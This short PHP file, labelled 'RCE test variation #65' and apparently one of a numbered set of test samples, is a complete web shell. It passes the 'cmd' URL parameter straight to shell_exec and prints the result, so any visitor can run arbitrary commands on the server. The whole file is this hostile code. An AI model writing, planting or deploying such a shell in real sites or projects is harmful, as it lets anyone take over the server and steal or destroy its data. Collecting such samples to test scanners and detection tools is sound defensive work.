<?php
// RCE test variation #65
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>